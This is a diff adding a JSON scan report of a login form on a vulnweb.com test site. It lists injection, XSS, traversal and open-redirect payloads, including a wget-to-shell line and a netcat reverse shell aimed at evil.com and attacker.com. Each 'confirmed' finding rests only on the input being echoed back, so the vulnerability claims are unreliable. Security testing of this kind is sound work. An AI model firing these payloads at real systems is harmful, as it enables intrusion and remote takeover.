@@ -1,0 +1,384 @@
+{
+    "info": {
+        "URL": "http://testhtml5.vulnweb.com",
+        "IP Address": "44.228.249.3",
+        "DNS": {
+            "A": [
+                "44.228.249.3"
+            ],
+            "AAAA": [],
+            "MX": [],
+            "NS": [
+                "ns3.eurodns.com.",
+                "ns1.eurodns.com.",
+                "ns2.eurodns.com.",
+                "ns4.eurodns.com."
+            ]
+        },
+        "WHOIS": {
+            "domain_name": "VULNWEB.COM",
+            "registrar": "EuroDNS S.A.",
+            "creation_date": "[datetime.datetime(2010, 6, 14, 7, 50, 29), datetime.datetime(2010, 6, 14, 0, 0)]",
+            "expiration_date": "[datetime.datetime(2026, 6, 14, 7, 50, 29), datetime.datetime(2026, 6, 13, 0, 0)]",
+            "emails": [
+                "legalservices@eurodns.com",
+                "administrator@invicti.com"
+            ]
+        },
+        "Technology Stack": {
+            "Headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:45:01 GMT",
+                "Content-Type": "text/html",
+                "Content-Length": "177",
+                "Connection": "close"
+            },
+            "Cookies": [
+                ""
+            ],
+            "Meta": {},
+            "CMS": null,
+            "Frontend": [],
+            "Backend": [
+                "Nginx"
+            ],
+            "CDN": [],
+            "Analytics": []
+        },
+        "Headers": {
+            "Server": "nginx/1.19.0",
+            "Date": "Tue, 19 Aug 2025 10:44:57 GMT",
+            "Content-Type": "text/html; charset=utf-8",
+            "Transfer-Encoding": "chunked",
+            "Connection": "keep-alive",
+            "Access-Control-Allow-Origin": "*",
+            "Content-Encoding": "gzip"
+        }
+    },
+    "pages": [
+        "http://testhtml5.vulnweb.com"
+    ],
+    "forms": [
+        {
+            "url": "http://testhtml5.vulnweb.com",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "method": "post",
+            "inputs": [
+                {
+                    "type": "text",
+                    "name": "username"
+                },
+                {
+                    "type": "password",
+                    "name": "password"
+                }
+            ]
+        }
+    ],
+    "vulnerabilities": [
+        {
+            "type": "HEADER_INJECTION",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "test%0d%0aSet-Cookie:evil=1",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:46:13 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b>test%0d%0aSet-Cookie:evil=1</b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600371664.png"
+        },
+        {
+            "type": "SQLI",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "' OR 1=1--",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:46:14 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b>' OR 1=1--</b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600372159.png"
+        },
+        {
+            "type": "XSS",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "<img src=x onerror=alert(1)>",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:46:15 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b><img src=x onerror=alert(1)></b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600373227.png"
+        },
+        {
+            "type": "OPEN_REDIRECT",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "//evil.com",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:46:14 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b>//evil.com</b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600372162.png"
+        },
+        {
+            "type": "RCE",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "`wget http://evil.com/shell.sh -O- | sh`",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:46:14 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b>`wget http://evil.com/shell.sh -O- | sh`</b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600372160.png"
+        },
+        {
+            "type": "LFI",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "/etc/passwd%00",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:46:15 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b>/etc/passwd%00</b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600373213.png"
+        },
+        {
+            "type": "CMD_INJECTION",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "test; ls -la",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:46:14 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b>test; ls -la</b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600372598.png"
+        },
+        {
+            "type": "SSTI",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "{{ config.items() }}",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:46:14 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b>{{ config.items() }}</b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600372152.png"
+        },
+        {
+            "type": "PATH_TRAVERSAL",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "../../../../../../etc/passwd",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:46:13 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b>../../../../../../etc/passwd</b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600371666.png"
+        },
+        {
+            "type": "SQLI",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "' OR '1'='1",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:46:26 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b>' OR '1'='1</b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600384182.png"
+        },
+        {
+            "type": "RCE",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "test; nc -e /bin/sh attacker.com 4444",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:46:25 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b>test; nc -e /bin/sh attacker.com 4444</b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600384123.png"
+        },
+        {
+            "type": "HEADER_INJECTION",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "value%0AContent-Length:0%0A",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:46:27 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b>value%0AContent-Length:0%0A</b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600385688.png"
+        },
+        {
+            "type": "LFI",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "../../../../etc/passwd",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:46:29 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b>../../../../etc/passwd</b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600387188.png"
+        },
+        {
+            "type": "OPEN_REDIRECT",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "/\\evil.com",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:46:39 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b>/\\evil.com</b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600397685.png"
+        },
+        {
+            "type": "SSTI",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "#{7*7}",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:46:42 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b>#{7*7}</b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600400733.png"
+        },
+        {
+            "type": "XSS",
+            "url": "http://testhtml5.vulnweb.com/login",
+            "payload": "<details open ontoggle=alert(1)>",
+            "method": "POST",
+            "action": "http://testhtml5.vulnweb.com/login",
+            "status_code": 200,
+            "headers": {
+                "Server": "nginx/1.19.0",
+                "Date": "Tue, 19 Aug 2025 10:47:01 GMT",
+                "Content-Type": "text/html; charset=utf-8",
+                "Transfer-Encoding": "chunked",
+                "Connection": "keep-alive",
+                "Access-Control-Allow-Origin": "*",
+                "Content-Encoding": "gzip"
+            },
+            "evidence": ">Acunetix Web Vulnerability Scanner</a>.\n            </p>\n\n            <p class=\"navbar-text pull-right\">\n                \n                Welcome <b><details open ontoggle=alert(1)></b> | <a href='/logout'>Logout</a>\n                \n            </p>\n        </div>\n    </div>\n</div>\n\n<div class=\"container-fluid\">\n    <div class=\"",
+            "screenshot": "webscan/reports/vulnweb.com/screenshots/1755600419508.png"
+        }
+    ]
+}
